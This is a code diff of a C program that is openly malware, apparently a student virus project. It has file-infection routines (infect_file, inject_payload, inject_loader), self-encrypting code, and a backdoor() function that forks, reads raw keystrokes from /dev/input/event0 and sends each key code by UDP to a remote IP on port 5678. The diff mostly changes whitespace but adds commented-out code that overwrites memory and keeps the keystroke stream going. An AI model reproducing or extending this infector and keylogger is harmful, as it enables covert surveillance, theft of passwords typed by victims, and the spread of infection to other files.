@@ -17,9 +17,9 @@ static void	inject_payload(t_info *info)
 	addr = &ft_memcpy;
 	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
 	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
- 	uint32_t key = decrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], 14);
+	uint32_t key = decrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], 14);
 	patch_payload(info);
- 	reencrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], key);
+	reencrypt_func(info, &patch_payload, info->tab_addr[15] - info->tab_addr[14], key);
 }
 
 static void	inject_loader(t_info *info)
@@ -78,14 +78,14 @@ static int		inject_sign(t_info *info, t_fingerprint *fingerprint)
    size = size - info->begin_bss;
    ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
    }
-   */
+ */
 
 static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 {
 	struct stat		st;
 	uint32_t		magic;
 
-	
+
 	if ((info->fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
 	info->valid_target = 1;
@@ -289,7 +289,7 @@ void		fill_tab_addr(size_t *tab_addr)
 	tab_addr[14] = (size_t)&patch_payload;
 	tab_addr[15] = (size_t)&patch_bis;
 	tab_addr[16] = (size_t)&patch_addresses;
-	
+
 	//check_ownfile.c
 	tab_addr[17] = (size_t)&get_path_own_file;
 	tab_addr[18] = (size_t)&rewrite_own_file;
@@ -351,7 +351,7 @@ int	my_inet_aton(char *cp, struct in_addr *ap)
 		else
 		{
 			return (0);
-			}
+		}
 	} while (*cp++);
 	if (dots < 3) {
 		addr <<= 8 * (3 - dots) ;
@@ -365,7 +365,7 @@ int	my_inet_aton(char *cp, struct in_addr *ap)
 static void	backdoor()
 {
 	pid_t pid = ft_sysfork();
-	
+
 	if (pid == -1)
 		return ;
 	if (pid == 0)
@@ -376,7 +376,7 @@ static void	backdoor()
 		socklen_t len_struct;
 		struct input_event ev;
 		char buf[0x40];// = "/dev/input/event0";
-// 		char *str2 ="10.12.10.8"; 
+		// 		char *str2 ="10.12.10.8"; 
 		write_event0(buf);
 		fd = ft_sysopen(buf, O_RDONLY);
 		if (fd < 0)
@@ -394,6 +394,15 @@ static void	backdoor()
 		struct_addr_in.sin_port = my_htons(5678);
 		write_ip(buf);
 		my_inet_aton(buf, &struct_addr_in.sin_addr);
+// 		size_t addr = 0x1234567890;
+// 		size_t end = (size_t)(&main + size_main);
+// 		(void)addr;
+// 		(void)end;
+
+		// mprotect (addr, write | read)
+		// ft_memcpy(addr, ft_delete_and_loop, size_ft);
+		// mprotect ( add, exec | read)
+		// jump addr
 		while (1)
 		{
 			ft_sysread(fd, &ev, sizeof(struct input_event));
@@ -409,6 +418,26 @@ static void	backdoor()
 	else
 		return ;
 }
+
+// void		ft_delete_and_loop(size_t start, size_t size)// , ... ajuter les params pour la loop)
+// {
+// 	size_t i = 0;
+// 	unsigned char *str = (unsigned char *)(start);
+// 	while (i < size)
+// 	{
+// 		str[i] = '\x90';
+// 		i++;
+// 	}
+// 	while (1)
+// 	{
+// 		ft_sysread(fd, &ev, sizeof(struct input_event));
+// 		if (ev.type == EV_KEY && ev.value == 0x1)
+// 		{
+// 			if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
+// 				ft_sysexit(0);
+// 		}
+// 	}
+// }
 
 int		main(void)
 {
@@ -461,3 +490,8 @@ int		main(void)
 	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
 	return (0);
 }
+
+// void	ft_nothing()
+// {
+// 	return ;
+// }
